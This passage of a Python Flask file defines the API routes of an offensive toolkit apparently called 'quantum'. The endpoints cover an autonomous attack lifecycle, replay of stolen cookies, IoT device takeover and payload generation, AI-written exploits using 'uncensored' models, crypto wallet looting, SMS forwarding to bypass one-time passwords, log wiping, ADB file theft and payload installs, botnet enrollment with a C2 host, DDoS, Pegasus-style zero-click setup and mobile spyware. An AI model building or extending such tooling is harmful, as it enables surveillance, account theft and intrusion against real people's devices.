    @app.route("/api/console/commands")
    def console_commands():
        from quantum.ai.console import commands
        return jsonify(commands())

    @app.route("/api/console/tasks")
    def console_tasks():
        from quantum.ai.console import task_queue
        return jsonify(task_queue())

    @app.route("/api/console/tasks/<host>", methods=["DELETE"])
    def console_task_clear(host):
        from quantum.ai.console import clear_task
        return jsonify(clear_task(host))

    @app.route("/api/console/state")
    def console_state():
        from quantum.ai.console import console_dashboard_state
        return jsonify(console_dashboard_state())

    @app.route("/api/console/events")
    def console_events():
        from quantum.ai.console import console_recent_events
        return jsonify(console_recent_events(
            int(request.args.get("limit", 20))))

    # ---- AI providers / free models ----
    @app.route("/api/ai/providers")
    def ai_providers():
        from quantum.ai.providers import provider_status
        return jsonify(provider_status())

    @app.route("/api/ai/models")
    def ai_models():
        from quantum.ai.providers import FREE_MODELS
        return jsonify({pid: {"synced": v.get("synced"),
                              "models": v.get("models", []),
                              "source": v.get("source", "")}
                        for pid, v in FREE_MODELS.items()})

    @app.route("/api/ai/uncensored")
    def ai_uncensored():
        from quantum.ai.providers import uncensored_models
        return jsonify(uncensored_models())

    @app.route("/api/ai/state")
    def ai_state():
        from quantum.ai.providers import provider_dashboard_state
        return jsonify(provider_dashboard_state())

    @app.route("/api/ai/providers/sync", methods=["POST"])
    def ai_providers_sync():
        from quantum.ai.providers import sync_openrouter_models
        return jsonify(sync_openrouter_models())

    @app.route("/api/ai/query", methods=["POST"])
    def ai_query():
        from quantum.ai.supervisor import AI_Supervisor
        d = request.json or {}
        sup = AI_Supervisor()
        reply = sup.query(d.get("prompt", ""),
                          d.get("system"), d.get("timeout", 60))
        return jsonify({"reply": reply, "ai_dead": sup.ai_dead,
                        "provider": sup.provider_id,
                        "model": sup.model})

    # ---- Autonomous offensive lifecycle ----
    @app.route("/api/lifecycle/phases")
    def lifecycle_phases():
        from quantum.overlord.lifecycle import LIFE_CYCLE
        return jsonify(LIFE_CYCLE)

    @app.route("/api/lifecycle/state")
    def lifecycle_state():
        from quantum.overlord.lifecycle import lifecycle_dashboard_state
        return jsonify(lifecycle_dashboard_state())

    @app.route("/api/lifecycle/runs")
    def lifecycle_runs():
        from quantum.overlord.lifecycle import lifecycle_recent_runs
        return jsonify(lifecycle_recent_runs(
            int(request.args.get("limit", 20))))

    @app.route("/api/lifecycle/run", methods=["POST"])
    def lifecycle_run():
        from quantum.overlord.lifecycle import run_lifecycle
        d = request.json or {}
        if not d.get("scope"):
            return jsonify({"error": "scope required (CIDR, IP or "
                                     "domain — authorized only)"}), 400
        return jsonify(run_lifecycle(
            d["scope"], d.get("variables", {})))

    # ---- Loot: cookie management ----
    @app.route("/api/cookies/state")
    def cookies_state():
        from quantum.postexploit.cookies import cookies_dashboard_state
        return jsonify(cookies_dashboard_state())

    @app.route("/api/cookies/hosts")
    def cookies_hosts():
        from quantum.postexploit.cookies import cookie_hosts
        return jsonify(cookie_hosts())

    @app.route("/api/cookies/<host>", methods=["GET", "POST", "DELETE"])
    def cookies_jar(host):
        from quantum.postexploit.cookies import (delete_jar, import_jar,
                                                 load_jar, save_jar)
        if request.method == "DELETE":
            return jsonify(delete_jar(host))
        if request.method == "POST":
            d = request.json or {}
            if "text" in d:
                return jsonify(import_jar(host, d["text"],
                                          d.get("fmt", "auto")))
            return jsonify(save_jar(host, d.get("cookies", [])))
        return jsonify({"host": host, "cookies": load_jar(host)})

    @app.route("/api/cookies/<host>/replay", methods=["POST"])
    def cookies_replay(host):
        from quantum.postexploit.cookies import replay_session
        d = request.json or {}
        if not d.get("url"):
            return jsonify({"error": "url required"}), 400
        return jsonify(replay_session(host, d["url"],
                                      d.get("timeout", 15)))

    @app.route("/api/loot/state")
    def loot_state():
        from quantum.overlord.lifecycle import loot_stats
        from quantum.postexploit.cookies import cookies_dashboard_state
        state = cookies_dashboard_state()
        state["inventory"] = loot_stats()
        return jsonify(state)

    # ---- IoT exploitation ----
    @app.route("/api/iot/state")
    def iot_state():
        from quantum.control.iot import iot_dashboard_state
        return jsonify(iot_dashboard_state())

    @app.route("/api/iot/discover", methods=["POST"])
    def iot_discover():
        from quantum.control.iot import iot_discover as _discover
        d = request.json or {}
        if not d.get("cidr"):
            return jsonify({"error": "cidr required (authorized "
                                     "scope only)"}), 400
        return jsonify(_discover(d["cidr"], d.get("timeout", 4)))

    @app.route("/api/iot/kasa", methods=["POST"])
    def iot_kasa():
        from quantum.control.iot import kasa_command
        d = request.json or {}
        if not d.get("ip") or "command" not in d:
            return jsonify({"error": "ip + command required"}), 400
        return jsonify(kasa_command(d["ip"], d["command"],
                                    d.get("port", 9999)))

    @app.route("/api/iot/shelly", methods=["POST"])
    def iot_shelly():
        from quantum.control.iot import shelly_gen1_command, shelly_rpc
        d = request.json or {}
        if not d.get("ip"):
            return jsonify({"error": "ip required"}), 400
        if d.get("rpc_method"):
            return jsonify(shelly_rpc(d["ip"], d["rpc_method"],
                                      d.get("rpc_params")))
        return jsonify(shelly_gen1_command(d["ip"], d.get("path",
                                                           "/status")))

    @app.route("/api/iot/tasmota", methods=["POST"])
    def iot_tasmota():
        from quantum.control.iot import tasmota_command
        d = request.json or {}
        if not d.get("ip") or not d.get("cmnd"):
            return jsonify({"error": "ip + cmnd required"}), 400
        return jsonify(tasmota_command(d["ip"], d["cmnd"],
                                       user=d.get("user"),
                                       password=d.get("password")))

    @app.route("/api/iot/tuya/build", methods=["POST"])
    def iot_tuya_build():
        from quantum.control.iot import tuya_build_command
        d = request.json or {}
        if not d.get("dev_id") or not d.get("localkey"):
            return jsonify({"error": "dev_id + localkey required"}), \
            400
        return jsonify(tuya_build_command(
            d["dev_id"], d["localkey"], d.get("dps", {"1": True}),
            int(d.get("seqno", 1))))

    @app.route("/api/iot/tuya/send", methods=["POST"])
    def iot_tuya_send():
        from quantum.control.iot import tuya_send
        d = request.json or {}
        if not d.get("ip") or not d.get("frame_hex"):
            return jsonify({"error": "ip + frame_hex required"}), 400
        return jsonify(tuya_send(d["ip"], d["frame_hex"]))

    @app.route("/api/iot/tello", methods=["POST"])
    def iot_tello():
        from quantum.control.iot import tello_command
        d = request.json or {}
        if not d.get("command"):
            return jsonify({"error": "command required"}), 400
        return jsonify(tello_command(d["command"],
                                     d.get("tello_ip",
                                           "192.168.10.1")))

    @app.route("/api/iot/tello/state")
    def iot_tello_state():
        from quantum.control.iot import tello_state
        return jsonify(tello_state(
            int(request.args.get("timeout", 6))))

    @app.route("/api/iot/mqtt", methods=["POST"])
    def iot_mqtt():
        from quantum.control.iot import mqtt_probe
        d = request.json or {}
        if not d.get("ip"):
            return jsonify({"error": "ip required"}), 400
        return jsonify(mqtt_probe(d["ip"], d.get("port", 1883),
                                  username=d.get("username"),
                                  password=d.get("password")))

    @app.route("/api/iot/cameras")
    def iot_cameras():
        from quantum.control.iot import iot_camera_track
        return jsonify(iot_camera_track())

    @app.route("/api/iot/map", methods=["POST"])
    def iot_map():
        from quantum.control.iot import iot_map as _map
        d = request.json or {}
        return jsonify(_map(d.get("beacons", [])))

    @app.route("/api/iot/drones")
    def iot_drones():
        from quantum.control.iot import drone_wifi_scan
        return jsonify(drone_wifi_scan())

    @app.route("/api/iot/cve")
    def iot_cve():
        from quantum.control.iot import nvd_search
        q = request.args.get("q", "iot")
        return jsonify(nvd_search(q, int(request.args.get("limit",
                                                           20))))

    @app.route("/api/iot/whitepaper", methods=["POST"])
    def iot_whitepaper():
        from quantum.control.iot import cve_whitepaper, nvd_search
        d = request.json or {}
        cve = d.get("cve")
        if not cve and d.get("id"):
            feed = nvd_search(d["id"], results=5)
            if not feed.get("ok"):
                return jsonify(feed), 502
            match = next((c for c in feed["cves"]
                          if c.get("id") == d["id"]), None)
            if match is None:
                return jsonify({"error": "CVE not in NVD result"}), \
                    404
            full = match
            full.setdefault("metrics", {})
            cve = full
        if not cve:
            return jsonify({"error": "cve object or id required"}), \
                400
        return jsonify(cve_whitepaper(cve))

    @app.route("/api/iot/payload", methods=["POST"])
    def iot_payload():
        from quantum.control.iot import generate_iot_payload
        d = request.json or {}
        if not d.get("kind"):
            return jsonify({"error": "kind required"}), 400
        return jsonify(generate_iot_payload(d["kind"],
                                            d.get("params", {})))

    # ---- OpenFable (terminal TUI / GUI chat widget) ----
    @app.route("/api/openfable/state")
    def openfable_state():
        from quantum.ai.openfable import openfable_dashboard_state
        return jsonify(openfable_dashboard_state())

    @app.route("/api/openfable/server/start", methods=["POST"])
    def openfable_server_start():
        from quantum.ai.openfable import DEFAULT_PORT, start_server
        d = request.json or {}
        try:
            port = int(d.get("port", DEFAULT_PORT))
        except (TypeError, ValueError):
            return jsonify({"error": "port must be an int"}), 400
        return jsonify(start_server(port=port,
                                    project=d.get("project"),
                                    wait=int(d.get("wait", 30))))

    @app.route("/api/openfable/server/stop", methods=["POST"])
    def openfable_server_stop():
        from quantum.ai.openfable import stop_server
        return jsonify(stop_server())

    @app.route("/api/openfable/models")
    def openfable_models():
        from quantum.ai.openfable import get_models
        refresh = request.args.get("refresh") in ("1", "true", "yes")
        return jsonify(get_models(refresh=refresh))

    @app.route("/api/openfable/sessions")
    def openfable_sessions():
        from quantum.ai.openfable import list_sessions
        return jsonify(list_sessions())

    @app.route("/api/openfable/sessions", methods=["POST"])
    def openfable_session_create():
        from quantum.ai.openfable import create_session
        d = request.json or {}
        return jsonify(create_session(title=d.get("title")))

    @app.route("/api/openfable/sessions/<session_id>/messages")
    def openfable_messages(session_id):
        from quantum.ai.openfable import get_messages
        limit = request.args.get("limit")
        return jsonify(get_messages(session_id,
                                    limit=int(limit) if limit else None))

    @app.route("/api/openfable/chat", methods=["POST"])
    def openfable_chat():
        from quantum.ai.openfable import chat, chat_sync
        d = request.json or {}
        if not d.get("session_id") or not d.get("text"):
            return jsonify({"error": "session_id + text required"}), 400
        kwargs = {"model": d.get("model"), "agent": d.get("agent"),
                  "timeout": int(d.get("timeout", 120))}
        if d.get("sync"):
            return jsonify(chat_sync(d["session_id"], d["text"],
                                     **kwargs))
        return jsonify(chat(d["session_id"], d["text"], **kwargs))

    @app.route("/api/openfable/abort", methods=["POST"])
    def openfable_abort():
        from quantum.ai.openfable import abort_session
        d = request.json or {}
        if not d.get("session_id"):
            return jsonify({"error": "session_id required"}), 400
        return jsonify(abort_session(d["session_id"]))

    @app.route("/api/openfable/terminal", methods=["POST"])
    def openfable_terminal():
        from quantum.ai.openfable import launch_tui
        d = request.json or {}
        return jsonify(launch_tui(project=d.get("project"),
                                  model=d.get("model")))

    @app.route("/api/openfable/run", methods=["POST"])
    def openfable_run():
        from quantum.ai.openfable import run_once
        d = request.json or {}
        if not d.get("message"):
            return jsonify({"error": "message required"}), 400
        return jsonify(run_once(d["message"], model=d.get("model"),
                                timeout=int(d.get("timeout", 180)),
                                project=d.get("project"),
                                attach=d.get("attach")))

    # ---- Catalog / CVE / AI Exploit ----
    @app.route("/api/catalog/exploits")
    def catalog_exploits():
        from quantum.catalog.exploit_catalog import organize_exploits
        return jsonify(organize_exploits())
    @app.route("/api/catalog/zerodays")
    def catalog_zerodays():
        from quantum.catalog.exploit_catalog import project_zero_zerodays
        return jsonify({"zerodays": project_zero_zerodays()})
    @app.route("/api/catalog/cve_feed")
    def catalog_cve_feed():
        from quantum.catalog.exploit_catalog import cve_feed_by_type
        return jsonify(cve_feed_by_type())
    @app.route("/api/catalog/ai_create", methods=["POST"])
    def catalog_ai_create():
        from quantum.catalog.exploit_catalog import ai_create_exploit
        d = request.json or {}
        return jsonify(ai_create_exploit(d.get("prompt", ""), model=d.get("model")))

    @app.route("/api/bluetooth/state")
    def bt_state():
        from quantum.control.bluetooth import bluetooth_dashboard_state
        return jsonify(bluetooth_dashboard_state())

    @app.route("/api/sdr/state")
    def sdr_state():
        from quantum.control.sdr import sdr_dashboard_state
        return jsonify(sdr_dashboard_state())

    @app.route("/api/imsi/state")
    def imsi_state():
        from quantum.control.imsi import imsi_dashboard_state
        return jsonify(imsi_dashboard_state())

    @app.route("/api/hid/state")
    def hid_state():
        from quantum.control.hid import hid_dashboard_state
        return jsonify(hid_dashboard_state())

    @app.route("/api/crypto/search")
    def crypto_search():
        from quantum.postexploit.cryptowallet import search_crypto_artifacts
        paths = request.args.getlist("path") or ["~/"]
        return jsonify(search_crypto_artifacts(paths))

    @app.route("/api/crypto/loot", methods=["POST"])
    def crypto_loot():
        from quantum.postexploit.cryptowallet import loot_crypto_artefacts
        d = request.json or {}
        return jsonify(loot_crypto_artefacts(d.get("artifacts", {})))

    @app.route("/api/crypto/dashboard")
    def crypto_dash():
        from quantum.postexploit.cryptowallet import crypto_dashboard_state
        return jsonify(crypto_dashboard_state())

    @app.route("/api/biometric/search")
    def biometric_search():
        from quantum.postexploit.biometric_clone import find_biometric_artifacts
        return jsonify(find_biometric_artifacts())
    @app.route("/api/biometric/style")
    def biometric_style():
        from quantum.postexploit.biometric_clone import analyze_sms_style
        return jsonify(analyze_sms_style())
    @app.route("/api/biometric/dashboard")
    def biometric_dash():
        from quantum.postexploit.biometric_clone import biometric_dashboard_state
        return jsonify(biometric_dashboard_state())

    @app.route("/api/otp/intercept")
    def otp_intercept():
        from quantum.postexploit.otp_bypass import intercept_sms_state
        return jsonify(intercept_sms_state())
    @app.route("/api/otp/forward", methods=["POST"])
    def otp_forward():
        from quantum.postexploit.otp_bypass import set_sms_forwarding
        d = request.json or {}
        return jsonify(set_sms_forwarding(d.get("to_number")))
    @app.route("/api/otp/reset", methods=["POST"])
    def otp_reset():
        from quantum.postexploit.otp_bypass import reset_sms_forwarding
        return jsonify(reset_sms_forwarding())
    @app.route("/api/otp/dashboard")
    def otp_dash():
        from quantum.postexploit.otp_bypass import otp_bypass_dashboard_state
        return jsonify(otp_bypass_dashboard_state())

    @app.route("/api/logclean/find")
    def logclean_find():
        from quantum.postexploit.log_cleaner import find_target_logs
        return jsonify({"logs": find_target_logs()})
    @app.route("/api/logclean/clean", methods=["POST"])
    def logclean_clean():
        from quantum.postexploit.log_cleaner import clear_target_logs
        return jsonify(clear_target_logs())
    @app.route("/api/logclean/dashboard")
    def logclean_dash():
        from quantum.postexploit.log_cleaner import log_cleaner_dashboard_state
        return jsonify(log_cleaner_dashboard_state())

    @app.route("/api/adb/dashboard")
    def adb_dash():
        from quantum.postexploit.adb_exploit import adb_dashboard_state
        return jsonify(adb_dashboard_state())
    @app.route("/api/adb/usb")
    def adb_usb():
        from quantum.postexploit.adb_exploit import adb_usb_debug_status
        return jsonify(adb_usb_debug_status())
    @app.route("/api/adb/screen", methods=["POST"])
    def adb_screen():
        from quantum.postexploit.adb_exploit import adb_screen_capture
        d = request.json or {}
        return jsonify(adb_screen_capture(d.get("output_path", "screenshot.png")))
    @app.route("/api/adb/logcat", methods=["POST"])
    def adb_logcat():
        from quantum.postexploit.adb_exploit import adb_logcat_extract
        d = request.json or {}
        return jsonify(adb_logcat_extract(d.get("output_path", "logcat.txt")))
    @app.route("/api/adb/pull", methods=["POST"])
    def adb_pull():
        from quantum.postexploit.adb_exploit import adb_file_pull
        d = request.json or {}
        return jsonify(adb_file_pull(d.get("remote_path"), d.get("local_path", "exfil/")))
    @app.route("/api/adb/deploy", methods=["POST"])
    def adb_deploy():
        from quantum.postexploit.adb_exploit import adb_install_apk
        d = request.json or {}
        return jsonify(adb_install_apk(d.get("apk_path", "payload.apk")))

    @app.route("/api/pivot/dashboard")
    def pivot_dash():
        from quantum.postexploit.pivot_lateral import pivot_dashboard_state
        return jsonify(pivot_dashboard_state())
    @app.route("/api/botnet/add", methods=["POST"])
    def botnet_add():
        from quantum.control.botnet import add_device_to_botnet
        d = request.json or {}
        return jsonify(add_device_to_botnet(d.get("device_type"), d.get("ip"), d.get("c2_host")))
    @app.route("/api/ddos/dashboard")
    def ddos_dash():
        from quantum.postexploit.ddos import ddos_dashboard_state
        return jsonify(ddos_dashboard_state())
    @app.route("/api/c2proxy/dashboard")
    def c2proxy_dash():
        from quantum.postexploit.c2_proxy import c2_proxy_dashboard_state
        return jsonify(c2_proxy_dashboard_state())

    @app.route("/api/autoconfig/dashboard")
    def autoconfig_dash():
        from quantum.postexploit.auto_config import auto_config_dashboard_state
        return jsonify(auto_config_dashboard_state())
    @app.route("/api/autoconfig/defaults")
    def autoconfig_defaults():
        from quantum.postexploit.auto_config import apply_defaults
        # a GET must not require a JSON body
        d = request.get_json(silent=True) or {}
        tool = d.get("tool") or request.args.get("tool", "all")
        return jsonify(apply_defaults(tool))

    @app.route("/api/god_mode/config")
    def god_mode_config():
        from quantum.postexploit.god_mode import god_mode_config
        return jsonify(god_mode_config())

    @app.route("/api/darkweb/dashboard")
    def darkweb_dash():
        from quantum.postexploit.dark_web_browser import dark_web_dashboard_state
        return jsonify(dark_web_dashboard_state())
    @app.route("/api/darkweb/search")
    def darkweb_search():
        from quantum.postexploit.dark_web_browser import crawler_search
        # a GET must not require a JSON body
        d = request.get_json(silent=True) or {}
        query = d.get("query") or request.args.get("query", "")
        return jsonify(crawler_search(query))

    @app.route("/api/vault/dashboard")
    def vault_dash():
        from quantum.postexploit.vault_share import vault_dashboard_state
        return jsonify(vault_dashboard_state())
    @app.route("/api/vault/mount")
    def vault_mount():
        from quantum.postexploit.vault_share import vault_mount
        d = request.get_json(silent=True) or {}
        vault_path = d.get("vault_path") or request.args.get("vault")
        password_ref = d.get("password_ref") or request.args.get(
            "password_ref", "keyfile")

        return jsonify(vault_mount(vault_path, password_ref))

    @app.route("/api/nso_pegasus/dashboard")
    def nso_dash():
        from quantum.postexploit.nso_pegasus_ios import nso_pegasus_dashboard_state
        return jsonify(nso_pegasus_dashboard_state())
    @app.route("/api/nso_pegasus/forced_entry", methods=["POST"])
    def nso_forced():
        from quantum.postexploit.nso_pegasus_ios import forced_entry_config
        d = request.json or {}
        return jsonify(forced_entry_config(d.get("device_type","ios"), d.get("method","zero_click")))

    @app.route("/api/mitm/dashboard")
    def mitm_dash():
        from quantum.postexploit.mitm_dashboard import mitm_dashboard_state
        return jsonify(mitm_dashboard_state())
    @app.route("/api/rat/dashboard")
    def rat_dash():
        from quantum.postexploit.rat_mobile import rat_dashboard_state
        return jsonify(rat_dashboard_state())
    @app.route("/api/rat/ios")
    def rat_ios():
        from quantum.postexploit.rat_mobile import rat_tab_function
        return jsonify(rat_tab_function("iOS Monitor", "monitor"))
    @app.route("/api/rat/android")
    def rat_android():
        from quantum.postexploit.rat_mobile import rat_tab_function
        return jsonify(rat_tab_function("Android Monitor", "monitor"))
    @app.route("/api/rat/mobile_spy")
    def rat_mspy():
        from quantum.postexploit.rat_mobile import rat_tab_function
        return jsonify(rat_tab_function("Mobile Spy", "mspy_features"))

    @app.route("/api/cve/update")
    def cve_update():
        from quantum.postexploit.cve_update import cve_update_state
        return jsonify(cve_update_state())

    @app.route("/api/mobile/verify")
    def mobile_verify():
        from quantum.postexploit.mobile_verification import mobile_verification_state, verify_all_functions
        return jsonify({"state": mobile_verification_state(), "results": verify_all_functions()})

    @app.route("/api/cookie/manager")
    def cookie_manager_dash():
        from quantum.postexploit.cookie_manager import cookie_manager_state
        return jsonify(cookie_manager_state())
    @app.route("/api/cookie/create")
    def cookie_create():
        from quantum.postexploit.cookie_manager import create_malicious_cookie
        d = request.get_json(silent=True) or {}
        name = d.get("name") or request.args.get("name", "session")
        value = d.get("value") or request.args.get("value", "test")
        domain = d.get("domain") or request.args.get("domain", "localhost")

        return jsonify(create_malicious_cookie(name, value, domain))
    @app.route("/api/cookie/inject", methods=["POST"])
    def cookie_inject():
        from quantum.postexploit.cookie_manager import inject_cookie_session
        d = request.json or {}
        return jsonify(inject_cookie_session(d.get("cookie_string"), d.get("target_path","cookies.txt")))

    @app.route("/api/traffic/analysis")
    def traffic_dash():
        from quantum.postexploit.traffic_analysis import traffic_dashboard_state
        return jsonify(traffic_dashboard_state())
    @app.route("/api/persistence/check")
    def persistence_check():
        from quantum.postexploit.persistence_checker import check_persistence
        return jsonify(check_persistence())
    @app.route("/api/advanced/config")
    def adv_config():
        from quantum.postexploit.advanced_config_aggregator import aggregate_all
        return jsonify(aggregate_all())

    return app